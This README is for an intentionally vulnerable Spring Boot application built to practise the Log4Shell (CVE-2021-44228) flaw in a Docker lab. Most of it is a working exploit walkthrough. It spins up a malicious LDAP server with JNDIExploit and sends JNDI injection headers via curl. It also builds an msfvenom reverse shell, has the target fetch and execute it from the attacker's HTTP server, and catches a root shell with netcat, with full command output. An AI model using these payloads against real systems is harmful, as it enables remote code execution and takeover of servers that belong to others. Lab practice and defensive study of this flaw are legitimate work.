# Log4Shell sample vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.

![](./screenshot.png)

## Running the application

Run it:

```bash
docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

Build it yourself (you don't need any Java-related tooling):

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
```

## Exploitation steps

*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*

**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528))... 
[Click Here](http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream) to Download the version cached by the Wayback Machine.*

* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server

```bash
wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
```

* Then, trigger the exploit using:

```bash
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

* Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:

```
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
```

* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:

```
$ docker exec vulnerable-app ls /tmp
...
pwned
...
```
## Remote Code Execution - CTF Style "How to get a reverse shell"
- create a reverse shell file using msfvenom
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f elf -o /tmp/rev.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: /tmp/rev.elf
```
- prepare local server using python on our attacking machine
```bash
$ sudo python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
```
- encode this command line below using `base64`
```bash
wget http://172.17.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
```
- copy base64 output
```bash
$ echo 'wget http://172.17.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf' | base64
d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK
```
- use JNDIExploit to spin up a malicious LDAP server
```bash
$ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
...
```
- then, run the command below to trigger our command
```
$ curl 172.17.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK}'
Hello, world!
```
- start netcat reverse shell on attacker machine `nc -lvnp 4444`, then netcat will be trigger a reverse shell
```bash
$ nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:42176.
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
whoami
root
```
- the output from JNDIExploit
```bash
...
[+] Received LDAP Query: Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK
[+] Paylaod: command
[+] Command: wget http://172.17.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/d2dldCBodHRwOi8vMTcyLjE3LjAuMTo4MDgxL3Jldi5lbGYgLU8gL3RtcC9yZXYuZWxmICYmIGNobW9kICt4IC90bXAvcmV2LmVsZiAmJiAvdG1wL3Jldi5lbGYK redirecting to http://172.17.0.1:8888/ExploitgV2vh72T6X.class
[+] New HTTP Request From /172.17.0.2:58650  /ExploitgV2vh72T6X.class
[+] Receive ClassRequest: ExploitgV2vh72T6X.class
[+] Response Code: 200
```

## Reference
- [Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [PSA: Log4Shell and the current state of JNDI injection](https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/)
- [Log4Shell sample vulnerable application (CVE-2021-44228)](https://github.com/christophetd/log4shell-vulnerable-app)
- [JNDIExploit](https://github.com/feihong-cs/JNDIExploit) `Update (Dec 13th): The JNDIExploit repository has been removed from GitHub`

## Contributors

[@christophetd](https://twitter.com/christophetd)
[@rayhan0x01](https://twitter.com/rayhan0x01)
